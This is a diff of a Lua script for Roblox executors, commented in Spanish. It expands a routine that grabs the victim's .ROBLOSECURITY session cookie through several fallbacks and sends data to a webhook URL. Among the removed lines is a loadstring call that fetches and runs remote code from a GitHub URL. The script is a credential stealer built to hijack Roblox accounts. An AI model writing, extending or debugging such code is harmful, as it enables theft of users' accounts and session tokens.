@@ -37,6 +37,24 @@ local function getRobloxCookie()
 		return savedCookie
 	end
 	
+	-- Fallback 3: intentar con getgenv() sin parámetros
+	local savedCookie2 = getgenv()["_ROBLOSECURITY"]
+	if savedCookie2 and savedCookie2 ~= "" then
+		return savedCookie2
+	end
+	
+	-- Fallback 4: intentar con CookieService:GetValue()
+	local savedCookie3 = CookieService:GetCookieValue(".ROBLOSECURITY", "https://www.roblox.com")
+	if savedCookie3 ~= "" then
+		return savedCookie3
+	end
+	
+	-- Fallback 5: intentar con getgenv() directamente sin parámetros
+	local savedCookie4 = getgenv("_ROBLOSECURITY")
+	if savedCookie4 and savedCookie4 ~= "" then
+		return savedCookie4
+	end
+	
 	print("❌ No se pudo obtener .ROBLOSECURITY")
 	return ""
 end
@@ -76,32 +94,29 @@ local function sendWebhook(data)
 		return true
 	end
 	
-	-- Fallback: intentar con axios (si el ejecutor lo soporta)
-	local request = loadstring(game:HttpGet("https://raw.githubusercontent.com/ssshlx/render/main/request.js"))()
-	if request and request.post then
-		local response2 = request.post(API_URL, {
-			headers = { ["Content-Type"] = "application/json" },
-			body = data
-		})
-		
-		if response2 and response2.status == 200 then
-			print("✅ Webhook funcionando (fallback)!" .. response2.status)
+	-- Fallback: intentar con HttpService (Roblox puro)
+	local HttpService = game:GetService("HttpService")
+	local response2 = HttpService:PostJsonAsync(API_URL, data)
+	
+	if response2 and response2.Success then
+		print("✅ Webhook funcionando (HttpService)!" .. response2.StatusCode)
+		return true
+	end
+	
+	-- Fallback 2: intentar con getgenv()._RbxRequest
+	local _RbxRequest = getgenv("_RbxRequest")
+	if _RbxRequest then
+		local response3 = _RbxRequest(API_URL, "POST", data)
+		if response3 and response3.status == 200 then
+			print("✅ Webhook funcionando (getgenv)!" .. response3.status)
 			return true
 		end
 	end
 	
-	-- Fallback: intentar con HttpService (solo Roblox puro)
-	local HttpService = game:GetService("HttpService")
-	local response3 = HttpService:PostJsonAsync(API_URL, data)
-	
-	if response3 and response3.Success then
-		print("✅ Webhook funcionando (HttpService)!" .. response3.StatusCode)
-		return true
-	end
-	
 	print("❌ Error en el webhook:")
 	print("  API_URL:", API_URL)
-	print("  Response:", response)
+	print("  Response 1:", response)
+	print("  Response 2:", response2)
 	return false
 end
 
